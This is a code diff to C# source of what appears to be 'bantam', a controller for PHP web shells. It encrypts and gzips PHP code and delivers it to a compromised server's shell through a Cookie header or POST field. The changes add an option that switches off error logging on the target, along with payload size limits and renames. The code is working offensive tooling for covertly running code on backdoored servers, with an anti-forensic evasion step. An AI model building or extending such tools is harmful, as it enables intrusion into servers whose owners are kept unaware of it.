@@ -101,7 +101,7 @@ namespace bantam.Classes
         /// <param name="input"></param>
         /// <param name="removeHeader"></param>
         /// <returns></returns>
-        public static byte[] gzCompress(byte[] input, bool removeHeader = true)
+        public static byte[] GzCompress(byte[] input, bool removeHeader = true)
         {
             using (var result = new MemoryStream()) {
                 var lengthBytes = BitConverter.GetBytes(input.Length);
@@ -204,6 +204,7 @@ namespace bantam.Classes
             string phpCode = phpCodeIn;
 
             if (string.IsNullOrEmpty(phpCode)) {
+                //todo level 3 logging
                 return new ResponseObject(string.Empty, string.Empty, string.Empty);
             }
 
@@ -220,7 +221,15 @@ namespace bantam.Classes
                 request.Headers.TryAddWithoutValidation("User-Agent", g_CurrentUserAgent);
 
                 if (encryptResponse) {
-                    phpCode += PhpHelper.EncryptPhpVariableAndEcho(ResponseEncryptionMode, ref ResponseEncryptionKey, ref ResponseEncryptionIV);
+                    phpCode += PhpBuilder.EncryptPhpVariableAndEcho(ResponseEncryptionMode, ref ResponseEncryptionKey, ref ResponseEncryptionIV);
+                }
+
+                if (Config.DisableErrorLogs) {
+                    phpCode = PhpBuilder.DisableErrorLogging() + phpCode;
+                }
+
+                if (Config.MaxExecutionTime) {
+                    phpCode = PhpBuilder.MaxExecutionTime() + phpCode;
                 }
 
                 phpCode = Helper.MinifyCode(phpCode);
@@ -228,7 +237,7 @@ namespace bantam.Classes
                 //todo cleanup / minimize and refactor this shit
                 if (gzipRequestData) {
                     byte[] phpCodeBytes = Encoding.UTF8.GetBytes(phpCode);
-                    phpCodeBytes = gzCompress(phpCodeBytes);
+                    phpCodeBytes = GzCompress(phpCodeBytes);
 
                     if (encryptRequest) {
                         string encryptionKey = BantamMain.Shells[url].RequestEncryptionKey;
@@ -275,6 +284,11 @@ namespace bantam.Classes
                 phpCode = HttpUtility.UrlEncode(phpCode);
 
                 if (sendViaCookie) {
+                    if (phpCode.Length > Config.MaxCookieSizeB) {
+                        //todo global logging
+                        return new ResponseObject(string.Empty, string.Empty, string.Empty);
+                    }
+
                     request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + phpCode);
 
                     if (encryptRequest && sendRequestEncryptionIV) {
@@ -287,6 +301,12 @@ namespace bantam.Classes
                         postArgs = string.Format(requestArgsName + "={0}&{1}={2}", phpCode, requestEncryptionIV_VarName, HttpUtility.UrlEncode(requestEncryptionIV));
                     } else {
                         postArgs = string.Format(requestArgsName + "={0}", phpCode);
+                    }
+
+                    int maxPostSizeBytes = (Config.MaxPostSizeKib * 1000);
+                    if (postArgs.Length > maxPostSizeBytes) {
+                        //todo global logging
+                        return new ResponseObject(string.Empty, string.Empty, string.Empty);
                     }
 
                     request.Content = new StringContent(postArgs, Encoding.UTF8, "application/x-www-form-urlencoded");
